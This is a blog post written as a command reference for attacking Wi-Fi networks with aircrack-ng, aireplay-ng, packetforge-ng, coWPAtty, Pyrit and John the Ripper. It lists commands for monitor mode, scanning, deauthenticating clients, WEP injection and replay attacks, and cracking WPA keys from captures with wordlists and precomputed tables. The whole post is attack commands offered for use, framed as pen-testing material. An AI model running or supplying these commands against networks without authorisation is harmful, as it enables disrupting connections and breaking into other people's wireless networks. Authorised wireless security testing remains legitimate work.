---
title: Attacking Wifi - Commands
categories: [Hacking, Pen Testing, Wireless, Aircrack-ng]
layout: post
---
This post will highlight many of the different aircrack-ng commands used in hacking/pen testing wireless networks.  This post does not go into the how, but is more of a reference of the commands and parameters.

[TOC]

## General

#### Monitor Mode
There are a couple different options for putting your wifi adapter into monitor mode.

> `iw dev <interface> set monitor none`

> `airmon-ng start <interface>`

#### Scanning Networks
Airodump-ng is used to scan for wifi networks and clients that are in the range of your wireless card

> `airodump-ng -c <channel> -w <capture> --wps --band abg --essid <essid> --bssid <bssid> <int>`

The following flags are all optional
* -c <channel> - This will filter your scan to a specific wifi channel
* --wps - This flag will include WPS information for wireless networks found
* -w <capture> - This flag will write the scan results to a file
* --band <bands> - This flag allows you to only scan wifi networks operating on specified bands
* --essid <essid> - This flag will filter the scan to a specific Client
* --bssid <bssid> - This flag will filter the scan to a specific AP

#### Deauthentication Attack
> `aireplay-ng -0 1 -a <ap> -c <client> <int>`

## Cracking

#### IV-based Crack
> `aircrack-ng <capture>`

#### PTW-based Crack
> `aircrack-ng -z <capture>`

#### Word List-based Crack
> `aircrack-ng -w <wordlist> <capture>`

#### Airolib DB Crack
> `aircrack-ng -r <dbName> <capture>`

#### JTR-based Crack
> `john --wordlist=<wordlist> --rules --stdout | aircrack-ng -e <essid> -w - <capture>`

## WEP Attacks

#### Fake Authentication
> `aireplay-ng -1 0 -e <essid> -a <ap> -h <you> <interface>`

#### ARP Request Replay Attack
> `aireplay-ng -3 -b <ap> -h <you> <interface>`

#### Interactive Packet Replay Attack
> `aireplay-ng -2 -b <ap> -d ff:ff:ff:ff:ff:ff -f 1 -m 68 -n 86 <interface>`

#### KoreK chopchop attack
> `aireplay-ng -4 -b <ap> -h <you> <interface>`

#### Fragmentaion Attack
> `aireplay-ng -5 -b <ap> -h <you> <interface>`

#### Craft ARP Request Packet**
> `packetforge-ng -0 -a <ap> -h <you> -l <sourceIP> -k <destIP> -y <xorFile> -w <out>`

#### Inject Packet**
> `aireplay-ng -2 -r <packet> <interface>`

#### Fake Shared Key Authentication
> `aireplay -1 -0 -e <essid> -y <captureFile> -a <ap> -h <you> <interface>`

## WPA Attacks

#### coWPAtty Attack 
> `cowpatty -r <capture> -f <wordlist> -2 -s <essid>`

#### Rainbow Table Generation
> `genpmk -f <wordlist> -d <hashesFilename> -s <essid>`

#### Rainbow Table coWPAtty Attack
> `cowpatty -r <capture> -d <hashesFilename> -2 -s <essid>`

#### Pyrit Sniff
> `pyrit -r <interface> -o <capture> stripLive`

#### Pyrit Crack Dictionary
> `pyrit -r <capture> -i <wordlist> -b <ap> attack_passthrough`

#### Pyrit Crack Database
Import Wordlist into Database
> `pyrit -i <wordlist> import_passwords`

Add the ESSID of the Access Point
> `pyrit -e <essid> create_essid`

Generate PMKs for the ESSID
> `pyrit batch`

Launch Pyrit in database mode
> `pyrit -r <capture> -b <ap> attack_db`


